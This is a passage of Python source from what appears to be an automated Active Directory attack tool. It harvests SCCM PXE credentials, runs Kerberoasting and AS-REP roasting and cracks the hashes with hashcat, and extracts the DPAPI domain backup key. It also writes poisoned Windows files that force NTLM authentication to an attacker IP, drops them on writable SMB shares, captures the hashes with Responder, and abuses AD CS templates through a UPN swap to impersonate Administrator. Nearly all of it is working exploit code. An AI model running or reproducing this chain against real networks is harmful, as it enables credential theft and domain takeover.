                f.write(f"Value: {value}\n\n")

            creds_found = True

    return creds_found


def _parse_variables_dat(dat_file: Path, cfg: Config) -> bool:
    """Parse VARIABLES.DAT for base64-encoded credentials."""
    import base64
    creds_found = False

    try:
        content = dat_file.read_text(errors="ignore")
    except Exception:
        content = dat_file.read_bytes().decode("utf-16-le", errors="ignore")

    for var_name in ["USERID", "USERPASSWORD", "USERDOMAIN"]:
        match = re.search(rf"{var_name}=(\S+)", content, re.IGNORECASE)
        if match:
            raw_value = match.group(1)
            # Try base64 decode
            try:
                decoded = base64.b64decode(raw_value).decode("utf-8", errors="ignore")
                ok(f"🔑 VARIABLES.DAT: {var_name} = {decoded}")
            except Exception:
                decoded = raw_value
                ok(f"🔑 VARIABLES.DAT: {var_name} = {raw_value}")

            loot = cfg.work_dir / "pxe-creds.txt"
            with open(loot, "a") as f:
                f.write(f"[VARIABLES.DAT]\n{var_name} = {decoded}\n\n")

            # Set credentials
            if var_name == "USERID" and not cfg.username:
                cfg.username = decoded
            elif var_name == "USERPASSWORD" and not cfg.password:
                cfg.password = decoded
            elif var_name == "USERDOMAIN" and not cfg.domain:
                cfg.domain = decoded

            creds_found = True

    if creds_found and cfg.has_creds:
        ok("🔑 PXE credentials set as active credentials for attack chain")

    return creds_found


def _parse_pxe_credentials(output: str, cfg: Config) -> bool:
    """Parse pxethiefy output for SCCM Management Point info and credentials."""
    creds_found = False

    # Management Point URL
    mp_match = re.search(r"SMSTSMP[=:\s]+(\S+)", output, re.IGNORECASE)
    if mp_match:
        ok(f"📋 SCCM Management Point: {mp_match.group(1)}")
        creds_found = True

    # Site code
    site_match = re.search(r"SiteCode[=:\s]+(\S+)", output, re.IGNORECASE)
    if site_match:
        detail(f"Site Code: {site_match.group(1)}")

    # Media GUID
    guid_match = re.search(r"MediaGuid[=:\s]+(\S+)", output, re.IGNORECASE)
    if guid_match:
        detail(f"Media GUID: {guid_match.group(1)}")

    # Network Access Account
    naa_user = re.search(r"NetworkAccess.*?User(?:name)?[=:\s]+(\S+)", output, re.IGNORECASE)
    naa_pass = re.search(r"NetworkAccess.*?Pass(?:word)?[=:\s]+(\S+)", output, re.IGNORECASE)
    if naa_user:
        ok(f"🔑 Network Access Account: {naa_user.group(1)}")
        if naa_pass:
            detail(f"Password: {naa_pass.group(1)}")
            if not cfg.has_creds:
                cfg.username = naa_user.group(1)
                cfg.password = naa_pass.group(1)
        creds_found = True

    # Save all output
    loot = cfg.work_dir / "pxe-creds.txt"
    with open(loot, "a") as f:
        f.write(f"[pxethiefy output]\n{output}\n\n")

    return creds_found


def _try_crack_pxe_hash(hashfile: Path, cfg: Config) -> str:
    """Attempt to crack SCCM PXE media password hash."""
    cracked_file = cfg.work_dir / "pxe-loot" / "pxe-cracked.txt"

    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
    if not wordlist:
        return ""

    # hashcat mode 28800 = SCCM PXE media
    if tool_exists("hashcat"):
        log.info(f"⚙️  Cracking PXE hash with hashcat (mode 28800)...")
        run(
            ["hashcat", "-m", "28800", str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet"],
            cfg, timeout=120
        )
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            return _first_line(cracked_file.read_text())

    return ""


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Kerberoasting + AS-REP Roasting
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _kerberoast(cfg: Config) -> list[str]:
    """Run impacket-GetUserSPNs to harvest TGS-REP hashes for cracking."""
    if not tool_exists("impacket-GetUserSPNs"):
        log.warning("impacket-GetUserSPNs not found — skipping Kerberoasting")
        return []

    hashfile = cfg.work_dir / "kerberoast-hashes.txt"
    log.info("Requesting TGS tickets for service accounts (Kerberoasting)...")

    cmd = ["impacket-GetUserSPNs"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += ["-dc-ip", cfg.dc_ip, "-request", "-outputfile", str(hashfile)]

    result = run(cmd, cfg, timeout=120)
    if result.returncode != 0:
        log.warning(f"GetUserSPNs failed: {_first_line(result.stderr or '')}")
        return []

    # Count SPNs found
    spn_count = len(re.findall(r"SPN\s+", result.stdout or "", re.IGNORECASE))
    if spn_count:
        ok(f"Found {spn_count} SPN(s) with Kerberoastable service accounts")

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        log.warning("No Kerberoast hashes obtained (no SPNs or all AES-only)")
        return []

    hashes = [l.strip() for l in hashfile.read_text().splitlines() if l.strip()]
    ok(f"Captured {len(hashes)} Kerberoast TGS-REP hash(es)")
    return hashes


def _asrep_roast(cfg: Config) -> list[str]:
    """Run impacket-GetNPUsers to harvest AS-REP hashes for accounts without pre-auth."""
    if not tool_exists("impacket-GetNPUsers"):
        log.warning("impacket-GetNPUsers not found — skipping AS-REP Roasting")
        return []

    hashfile = cfg.work_dir / "asrep-hashes.txt"
    log.info("Checking for accounts without Kerberos pre-authentication (AS-REP Roasting)...")

    # With creds, we can enumerate and request all at once
    cmd = ["impacket-GetNPUsers"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += ["-dc-ip", cfg.dc_ip, "-request", "-format", "hashcat",
            "-outputfile", str(hashfile)]

    # If we have a user list, use it instead for unauthenticated mode
    users_file = cfg.work_dir / "domain-users.txt"
    if users_file.exists() and not cfg.has_creds:
        cmd = [
            "impacket-GetNPUsers", f"{cfg.domain}/",
            "-dc-ip", cfg.dc_ip,
            "-usersfile", str(users_file),
            "-format", "hashcat",
            "-outputfile", str(hashfile),
        ]

    result = run(cmd, cfg, timeout=120)
    if result.returncode != 0:
        log.warning(f"GetNPUsers failed: {_first_line(result.stderr or '')}")
        return []

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        log.info("No AS-REP roastable accounts found (all have pre-auth enabled)")
        return []

    hashes = [l.strip() for l in hashfile.read_text().splitlines() if l.strip()]
    ok(f"Captured {len(hashes)} AS-REP hash(es)")
    return hashes


def _crack_roast_hashes(hashfile: Path, mode: int, label: str, cfg: Config) -> list[str]:
    """Crack Kerberoast or AS-REP hashes with hashcat. Returns list of cracked passwords."""
    if not hashfile.exists() or hashfile.stat().st_size == 0:
        return []

    cracked_file = hashfile.parent / f"{hashfile.stem}-cracked.txt"

    # Find wordlist (prefer uncompressed, auto-decompress .gz)
    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
        if wl.suffix == ".gz" and wl.exists():
            plain = wl.with_suffix("")
            if plain.exists():
                wordlist = plain
                break
            log.info(f"📦 Decompressing {wl.name}...")
            run(["gunzip", "-k", str(wl)], cfg, timeout=60)
            if plain.exists():
                wordlist = plain
                break

    if not tool_exists("hashcat"):
        log.warning(f"hashcat not found — cannot crack {label} hashes")
        detail(f"Crack manually: hashcat -m {mode} {hashfile} <wordlist>")
        return []

    # Quick-crack: extract usernames from hashes and try username=password patterns
    usernames = set()
    for line in hashfile.read_text().splitlines():
        if "$" in line:
            # Kerberoast: $krb5tgs$23$*USER$DOMAIN*...
            # AS-REP: $krb5asrep$23$USER@DOMAIN:...
            user_match = re.search(r"\$\*?([^$@:*]+?)[\$@*]", line)
            if user_match:
                usernames.add(user_match.group(1))

    if usernames:
        mini_wl = hashfile.parent / f"{hashfile.stem}-quick-wordlist.txt"
        patterns = []
        for u in usernames:
            patterns += [u, u.lower(), u.upper(), u.capitalize(),
                         f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
                         u[::-1]]
        patterns += ["password", "Password1", "P@ssw0rd", "Welcome1",
                     "Changeme1", "Winter2026", "Summer2026", "Admin123",
                     "Company1", "letmein", "qwerty", "123456"]
        mini_wl.write_text("\n".join(patterns) + "\n")
        log.info(f"⚡ Quick-crack: trying {len(patterns)} username patterns for {label}...")
        run(
            ["hashcat", "-m", str(mode), str(hashfile), str(mini_wl),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=10"],
            cfg, timeout=15
        )
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            ok(f"⚡ Quick-crack hit for {label}!")

    if not wordlist:
        log.warning(f"No wordlist found for {label} cracking")
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            # Quick-crack found something even without wordlist
            pass
        else:
            return []

    if wordlist:
        log.info(f"Cracking {label} hashes (hashcat mode {mode})...")
        run(
            ["hashcat", "-m", str(mode), str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=240"],  # Hard cap: 4 minutes max
            cfg, timeout=300    # Process kill safety net: 5 minutes
        )

    if not cracked_file.exists() or cracked_file.stat().st_size == 0:
        log.warning(f"No {label} passwords cracked with wordlist {wordlist.name}")
        return []

    cracked = [l.strip() for l in cracked_file.read_text().splitlines() if l.strip()]
    ok(f"Cracked {len(cracked)} {label} password(s)!")
    for pw in cracked:
        detail(f"  {pw}")
    return cracked


def run_roast_attack(cfg: Config) -> bool:
    """Kerberoast + AS-REP Roast to harvest crackable service account hashes."""
    phase_header("KERBEROASTING + AS-REP ROASTING")

    if not cfg.has_creds:
        log.error("Roasting requires domain credentials (-u/-p or -H)")
        return False

    any_cracked = False

    # 1. Kerberoasting
    kerb_hashes = _kerberoast(cfg)
    if kerb_hashes:
        hashfile = cfg.work_dir / "kerberoast-hashes.txt"
        # Detect hash type from prefix
        sample = kerb_hashes[0] if kerb_hashes else ""
        if "$krb5tgs$17$" in sample or "$krb5tgs$18$" in sample:
            mode = 19700  # AES
            detail("Hash type: Kerberos 5 TGS-REP AES (mode 19700)")
        else:
            mode = 13100  # RC4 (default, $krb5tgs$23$)
            detail("Hash type: Kerberos 5 TGS-REP RC4 (mode 13100)")

        cracked = _crack_roast_hashes(hashfile, mode, "Kerberoast", cfg)
        if cracked:
            any_cracked = True
            # Save cracked creds
            cred_file = cfg.work_dir / "kerberoast-cracked.txt"
            cred_file.write_text("\n".join(cracked) + "\n")
            success_box(f"Kerberoast: {len(cracked)} password(s) cracked!")

    separator()

    # 2. AS-REP Roasting
    asrep_hashes = _asrep_roast(cfg)
    if asrep_hashes:
        hashfile = cfg.work_dir / "asrep-hashes.txt"
        cracked = _crack_roast_hashes(hashfile, 18200, "AS-REP", cfg)
        if cracked:
            any_cracked = True
            cred_file = cfg.work_dir / "asrep-cracked.txt"
            cred_file.write_text("\n".join(cracked) + "\n")
            success_box(f"AS-REP Roast: {len(cracked)} password(s) cracked!")

    if not kerb_hashes and not asrep_hashes:
        log.warning("No roastable accounts found in the domain")
    elif not any_cracked and (kerb_hashes or asrep_hashes):
        log.warning("Hashes captured but not cracked — try larger wordlists or rules")
        detail(f"Kerberoast hashes: {cfg.work_dir / 'kerberoast-hashes.txt'}")
        detail(f"AS-REP hashes: {cfg.work_dir / 'asrep-hashes.txt'}")

    return any_cracked


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DPAPI Backup Key Extraction
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_dpapi_backup(cfg: Config) -> bool:
    """Extract DPAPI domain backup key after successful DCSync."""
    phase_header("DPAPI BACKUP KEY EXTRACTION")

    if not tool_exists("impacket-dpapi"):
        log.warning("impacket-dpapi not found — skipping DPAPI backup key extraction")
        return False

    if not cfg.has_creds:
        log.error("DPAPI backup key extraction requires domain credentials")
        return False

    # Check if secretsdump ran successfully
    dump_file = cfg.work_dir / "secretsdump.txt"
    if dump_file.exists() and ":::" in dump_file.read_text():
        ok("DCSync output found — proceeding with DPAPI backup key extraction")
    else:
        log.warning("No secretsdump output found — DPAPI extraction may fail without DA privileges")

    log.info("Extracting DPAPI domain backup key...")
    pvk_output = cfg.work_dir / "dpapi-backupkey.pvk"

    # Format: impacket-dpapi backupkeys -t domain/user:password@DC_IP --export
    target = cfg.dc_ip or cfg.dc_fqdn
    cmd = ["impacket-dpapi", "backupkeys", "--export"]
    if cfg.nthash:
        cmd += ["-t", f"{cfg.domain}/{cfg.username}@{target}",
                "-hashes", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]
    else:
        cmd += ["-t", f"{cfg.domain}/{cfg.username}:{cfg.password}@{target}"]

    result = run(cmd, cfg, timeout=120, outfile=cfg.work_dir / "dpapi-backup.txt")

    if result.returncode != 0:
        log.warning(f"DPAPI backup key extraction failed: {_first_line(result.stderr or '')}")
        return False

    # Look for .pvk file — impacket-dpapi writes to cwd or work_dir
    pvk_found = False
    for candidate in [
        Path(".") / "ntds_capi_0_*.pvk",
        Path(".") / "*.pvk",
        cfg.work_dir / "ntds_capi_0_*.pvk",
        cfg.work_dir / "*.pvk",
        Path.home() / "ntds_capi_0_*.pvk",
        Path.home() / "*.pvk",
    ]:
        for pvk in candidate.parent.glob(candidate.name):
            try:
                import shutil as _shutil
                _shutil.copy2(str(pvk), str(pvk_output))
                pvk_found = True
                ok(f"DPAPI backup key saved: {pvk_output}")
                break
            except Exception as e:
                log.warning(f"Failed to copy PVK file: {e}")
        if pvk_found:
            break

    # Also check output text and saved output file for key material
    output_text = result.stdout or ""
    backup_txt = cfg.work_dir / "dpapi-backup.txt"
    if backup_txt.exists():
        output_text += backup_txt.read_text()
    if "Exporting private key" in output_text or "backupkey" in output_text.lower() or pvk_found:
        success_box("DPAPI domain backup key extracted!")
        detail("This key decrypts ALL user DPAPI secrets (credentials, certificates, etc.)")
        detail("Usage: dpapi.py masterkey -file <masterkey> -pvk dpapi-backupkey.pvk")
        detail("Then:  dpapi.py credential -file <blob> -key <decrypted_key>")
        return True

    if re.search(r"backup.*key|domain.*key|private.*key", output_text, re.IGNORECASE):
        ok("DPAPI backup key data retrieved (check output for key material)")
        return True

    log.warning("DPAPI backup key extraction did not produce expected output")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NTLM Theft File Drops (CVE-2025-24054 / CVE-2024-21320)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _craft_ntlm_theft_files(attacker_ip: str, work_dir: Path) -> list[Path]:
    """Craft poisoned files that trigger NTLM authentication when a user browses a share."""
    theft_dir = work_dir / "ntlm-theft"
    theft_dir.mkdir(exist_ok=True)
    files = []

    # desktop.ini — triggers when folder is browsed in Explorer
    ini_path = theft_dir / "desktop.ini"
    ini_path.write_text(
        f"[.ShellClassInfo]\n"
        f"IconResource=\\\\{attacker_ip}\\share\\icon.ico\n"
    )
    files.append(ini_path)

    # .library-ms — triggers on folder browse (Windows Library format)
    lib_path = theft_dir / "Documents.library-ms"
    lib_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n'
        '  <name>@shell32.dll,-34575</name>\n'
        '  <version>2</version>\n'
        '  <isLibraryPinned>true</isLibraryPinned>\n'
        '  <iconReference>imageres.dll,-1003</iconReference>\n'
        '  <searchConnectorDescriptionList>\n'
        '    <searchConnectorDescription>\n'
        '      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n'
        f'      <simpleLocation><url>\\\\{attacker_ip}\\share</url></simpleLocation>\n'
        '    </searchConnectorDescription>\n'
        '  </searchConnectorDescriptionList>\n'
        '</libraryDescription>\n'
    )
    files.append(lib_path)

    # .theme — triggers when file is previewed or opened
    theme_path = theft_dir / "company.theme"
    theme_path.write_text(
        "[Theme]\n"
        "DisplayName=Corporate Theme\n"
        f"BrandImage=\\\\{attacker_ip}\\share\\bg.jpg\n"
        "\n"
        "[Control Panel\\Desktop]\n"
        f"Wallpaper=\\\\{attacker_ip}\\share\\wallpaper.jpg\n"
    )
    files.append(theme_path)

    # .url — triggers when icon is loaded by Explorer
    url_path = theft_dir / "important.url"
    url_path.write_text(
        "[InternetShortcut]\n"
        "URL=https://example.com\n"
        f"IconFile=\\\\{attacker_ip}\\share\\icon.ico\n"
        "IconIndex=0\n"
    )
    files.append(url_path)

    # .searchConnector-ms — triggers on folder browse
    sc_path = theft_dir / "Search.searchConnector-ms"
    sc_path.write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">\n'
        '  <description>Search Connector</description>\n'
        f'  <simpleLocation><url>\\\\{attacker_ip}\\share</url></simpleLocation>\n'
        '</searchConnectorDescription>\n'
    )
    files.append(sc_path)

    ok(f"Crafted {len(files)} NTLM theft file(s) in {theft_dir}")
    return files


def _find_writable_shares(cfg: Config) -> list[tuple[str, str]]:
    """Discover writable SMB shares on the network. Returns list of (host, share) tuples."""
    shares = []
    target = cfg.specific_target or cfg.target_net
    if not target:
        log.warning("No target for share enumeration")
        return []

    log.info(f"Enumerating writable SMB shares on {target}...")
    shares_output = cfg.work_dir / "writable-shares.txt"

    if cfg.has_creds:
        cmd = ["nxc", "smb", target]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["--shares"]
    else:
        cmd = ["nxc", "smb", target, "--shares", "-u", "", "-p", ""]

    result = run(cmd, cfg, timeout=120, outfile=shares_output)
    if result.returncode != 0:
        log.warning("Share enumeration failed")
        return []

    # Parse nxc output for writable shares
    # Format: SMB  10.0.0.1  445  DC01  ShareName  READ,WRITE  Comment
    for line in (result.stdout or "").splitlines():
        if "WRITE" in line.upper():
            parts = line.split()
            # Find the IP (second field after SMB marker)
            ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
            if ip_match:
                host = ip_match.group(1)
                # Find share name — usually comes after the hostname
                share_match = re.search(
                    r"\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+(\S+)\s+.*WRITE",
                    line, re.IGNORECASE
                )
                if share_match:
                    share_name = share_match.group(1)
                    # Skip default admin shares
                    if share_name.upper() not in ("C$", "ADMIN$", "IPC$"):
                        shares.append((host, share_name))

    if shares:
        ok(f"Found {len(shares)} writable share(s)")
        for host, share in shares:
            detail(f"  \\\\{host}\\{share}")
    else:
        log.warning("No writable shares found")

    return shares


def _drop_file_on_share(host: str, share: str, local_file: Path,
                        remote_name: str, cfg: Config) -> bool:
    """Drop a file onto a writable SMB share."""
    log.info(f"  Dropping {remote_name} on \\\\{host}\\{share}")

    if cfg.has_creds:
        cmd = ["nxc", "smb", host]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["--put-file", str(local_file), remote_name]
        result = run(cmd, cfg, timeout=30)
    else:
        # Null session via smbclient
        if not tool_exists("smbclient"):
            log.warning("smbclient not found for null session upload")
            return False
        result = run(
            ["smbclient", f"//{host}/{share}", "-N",
             "-c", f"put {local_file} {remote_name}"],
            cfg, timeout=30
        )

    if result.returncode == 0:
        ok(f"  Dropped {remote_name} on \\\\{host}\\{share}")
        return True
    else:
        log.warning(f"  Failed to drop {remote_name} on \\\\{host}\\{share}")
        return False


def run_ntlm_theft(cfg: Config) -> bool:
    """Drop poisoned files on writable SMB shares to capture NTLM hashes."""
    phase_header("NTLM THEFT FILE DROPS (CVE-2025-24054 / CVE-2024-21320)")

    if not cfg.attacker_ip:
        log.error("Attacker IP required for NTLM theft files — use -a")
        return False

    # 1. Craft poisoned files
    theft_files = _craft_ntlm_theft_files(cfg.attacker_ip, cfg.work_dir)
    if not theft_files:
        log.error("Failed to craft NTLM theft files")
        return False

    # 2. Find writable shares
    writable_shares = _find_writable_shares(cfg)
    if not writable_shares:
        log.warning("No writable shares found — cannot drop NTLM theft files")
        return False

    # 3. Drop files on shares
    drops_file = cfg.work_dir / "ntlm-theft-drops.txt"
    dropped = 0
    with open(drops_file, "w") as f:
        for host, share in writable_shares:
            for theft_file in theft_files:
                remote_name = theft_file.name
                if _drop_file_on_share(host, share, theft_file, remote_name, cfg):
                    f.write(f"\\\\{host}\\{share}\\{remote_name}\n")
                    dropped += 1

    if dropped == 0:
        log.warning("Failed to drop any NTLM theft files")
        return False

    ok(f"Dropped {dropped} file(s) across {len(writable_shares)} share(s)")
    detail(f"Drops tracked in: {drops_file}")

    # 4. Start Responder to capture hashes (if ntlmrelayx isn't already running)
    iface = cfg.iface or "eth0"
    bg_procs = []
    captured = False

    try:
        # Check if ntlmrelayx is already running (port conflict with Responder)
        ntlmrelayx_running = False
        try:
            check = subprocess.run(
                ["pgrep", "-f", "ntlmrelayx"], capture_output=True, text=True, timeout=5
            )
            ntlmrelayx_running = check.returncode == 0
        except Exception:
            pass

        if ntlmrelayx_running:
            log.info("ntlmrelayx already running — relying on it for hash capture")
            detail("Hashes will appear in ntlmrelayx output when users browse poisoned shares")
        elif tool_exists("responder"):
            log.info(f"Starting Responder on {iface} to capture NTLM hashes...")
            resp_output = cfg.work_dir / "responder-theft.txt"
            resp_proc = run(
                ["responder", "-I", iface, "-wv"],
                cfg, bg=True, outfile=resp_output
            )
            if hasattr(resp_proc, 'poll'):
                bg_procs.append(resp_proc)
        else:
            log.warning("No Responder available — hashes will only be captured if ntlmrelayx is running")

        # 5. Wait briefly for hash captures
        ok("NTLM theft files deployed — waiting for users to browse shares...")
        max_wait = min(cfg.poison_duration, 120)
        waited = 0
        while waited < max_wait:
            # Check Responder logs for captures
            resp_logs = Path("/usr/share/responder/logs")
            if resp_logs.is_dir():
                for logf in resp_logs.glob("*NTLMv2*.txt"):
                    if logf.stat().st_mtime > cfg.start_time:
                        content = logf.read_text()
                        if "::" in content:
                            ok("Captured NTLM hash via theft file!")
                            captured = True
                            break
            if captured:
                break
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"Listening for NTLM theft responses... ({waited}/{max_wait}s)")

        # Extract hashes
        extract_hashes(cfg)

        if captured:
            success_box("NTLM theft file drops captured authentication!")
        else:
            log.info("No immediate captures — files remain on shares for passive collection")
            detail("Users browsing the shares will trigger NTLM authentication to your IP")

        return captured

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AD CS Enumeration — Certihound (ESC1-17) with certipy fallback
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _certihound_find(cfg: Config) -> Optional[dict]:
    """Enumerate ADCS via Certihound. Returns {vulns, ca_name, ca_host} or None on failure.

    vulns: list[tuple[str, str]] of (ESC_type, template_name).
    NT hash auth unsupported — falls back to certipy when nthash-only auth is used.
    """
    if not tool_exists("certihound"):
        return None
    if cfg.nthash and not cfg.password:
        log.info("Certihound does not support NT-hash auth — falling back to certipy")
        return None

    out_dir = cfg.work_dir / "certihound"
    out_dir.mkdir(exist_ok=True)

    cmd = ["certihound", "-d", cfg.domain, "-u", cfg.username,
           "-p", cfg.password, "--dc", cfg.dc_ip,
           "-o", str(out_dir), "--format", "both"]

    log.info("🔍 Enumerating AD CS with Certihound...")
    # OpenSSL 3 disables MD4 by default on Debian/Ubuntu — NTLM needs it
    env_prev = os.environ.get("OPENSSL_CONF")
    legacy_conf = out_dir / "openssl-legacy.cnf"
    legacy_conf.write_text(
        "openssl_conf = openssl_init\n"
        "[openssl_init]\nproviders = provider_sect\n"
        "[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n"
        "[default_sect]\nactivate = 1\n"
        "[legacy_sect]\nactivate = 1\n"
    )
    os.environ["OPENSSL_CONF"] = str(legacy_conf)
    try:
        result = run(cmd, cfg, timeout=180)
    finally:
        if env_prev is None:
            os.environ.pop("OPENSSL_CONF", None)
        else:
            os.environ["OPENSSL_CONF"] = env_prev

    if result.returncode != 0:
        log.warning("Certihound enumeration failed — falling back to certipy")
        return None

    # 1. Parse the structured vulnerabilities report
    vulns: list[tuple[str, str]] = []
    ca_name = cfg.ca_name or ""
    ca_host = ""

    try:
        for vf in sorted(out_dir.glob("*_vulnerabilities.json")):
            data = json.loads(vf.read_text())
            for item in data.get("vulnerabilities", []):
                esc = str(item.get("type", "")).upper()
                tmpl = item.get("template") or item.get("ca") or "unknown"
                if esc.startswith("ESC"):
                    vulns.append((esc, tmpl))
                    if not ca_name and item.get("ca"):
                        ca_name = item["ca"]
    except Exception as e:
        log.warning(f"Certihound vulnerabilities parse error: {e}")

    # 2. Parse enterprise CA file for DNS hostname
    try:
        for cf in sorted(out_dir.glob("*_enterprisecas.json")):
            data = json.loads(cf.read_text())
            for node in data.get("data", []):
                props = node.get("Properties", {})
                if not ca_name:
                    ca_name = props.get("caname", "")
                if not ca_host:
                    ca_host = props.get("dnshostname", "")
                if ca_host:
                    break
    except Exception as e:
        log.warning(f"Certihound CA parse error: {e}")

    # Dedupe while preserving order
    seen = set()
    deduped = []
    for v in vulns:
        if v not in seen:
            seen.add(v)
            deduped.append(v)

    if not deduped:
        log.warning("Certihound ran but detected no ESC vulnerabilities")
        return None

    if not ca_host and cfg.dc_ip:
        ca_host = cfg.dc_ip

    ok(f"Certihound: {len(deduped)} vulnerability/ies detected (CA: {ca_name or '?'})")
    return {"vulns": deduped, "ca_name": ca_name, "ca_host": ca_host}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AD CS Exploitation (ESC1-ESC16 via certipy; ESC5/ESC17 detection-only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _adcs_esc9_esc10_attack(template: str, ca_name: str, esc_type: str,
                            cfg: Config, pfx_stem: Path,
                            pfx_path: Path) -> Optional[str]:
    """ESC9/ESC10 UPN-swap attack — bypasses CVE-2022-26923 SID binding.

    Requires a victim account whose UPN we can write. Caller controls
    the victim via --esc-victim USER:PASS. Always restores UPN in finally.
    """
    if not cfg.esc_victim_user or not cfg.esc_victim_password:
        log.warning(f"  {esc_type} requires --esc-victim USER:PASS (controllable account)")
        detail("  Hint: pick a user you have GenericWrite on, or whose password you reset")
        return None

    victim = cfg.esc_victim_user
    victim_pwd = cfg.esc_victim_password
    log.info(f"  Exploiting {esc_type} via UPN swap: victim={victim} → impersonate Administrator")

    # Caller's own creds (used for the LDAP UPN write; presupposes WriteProperty on victim)
    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
    if cfg.nthash:
        auth_args += ["-hashes", f":{cfg.nthash}"]
    else:
        auth_args += ["-p", cfg.password]

    # 1. Read original UPN so we can restore it
    read_cmd = ["certipy", "account"] + auth_args + ["-user", victim, "read"]
    read_result = run(read_cmd, cfg, timeout=60)
    orig_upn_match = re.search(r"userPrincipalName\s*:\s*(\S+)", read_result.stdout or "")
    orig_upn = orig_upn_match.group(1) if orig_upn_match else ""
    detail(f"  Original UPN of {victim}: {orig_upn or '<unset>'}")

    # 2. Swap UPN to "Administrator" (sAMAccountName form, no @domain)
    log.info(f"  Setting {victim}.userPrincipalName = Administrator")
    swap_cmd = ["certipy", "account"] + auth_args + [
        "-user", victim, "-upn", "Administrator", "update"
    ]
    swap_result = run(swap_cmd, cfg, timeout=60)
    if swap_result.returncode != 0:
        log.warning(f"  {esc_type}: Failed to update UPN — need WriteProperty on {victim}")
        return None

    pfx = None
    try:
        # 3. Enroll cert as victim (uses victim's password, not ours)
        log.info(f"  Enrolling cert as {victim}@{cfg.domain} via template '{template}'...")
        enroll_cmd = [
            "certipy", "req",
            "-u", f"{victim}@{cfg.domain}", "-p", victim_pwd,
            "-dc-ip", cfg.dc_ip,
            "-ca", ca_name, "-template", template,
            "-out", str(pfx_stem)
        ]
        enroll_result = run(enroll_cmd, cfg, timeout=120)
        if enroll_result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Cert enrolled as {victim} with SAN=Administrator")
            pfx = str(pfx_path)
        else:
            log.warning(f"  {esc_type}: Cert enrollment failed")
    finally:
        # 4. ALWAYS restore UPN — even on exception, even if enrollment failed
        log.info(f"  Restoring {victim}.userPrincipalName")
        restore_cmd = ["certipy", "account"] + auth_args + [
            "-user", victim, "-upn", orig_upn or "", "update"
        ]
        restore_result = run(restore_cmd, cfg, timeout=60)
        if restore_result.returncode == 0:
            ok(f"  {esc_type}: UPN restored to '{orig_upn or '<unset>'}'")
        else:
            log.error(f"  {esc_type}: FAILED TO RESTORE UPN — manually set "
                      f"{victim}.userPrincipalName = '{orig_upn}'")

    return pfx


def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
                           cfg: Config) -> Optional[str]:
    """Exploit a vulnerable AD CS template. Returns PFX path on success, None on failure."""
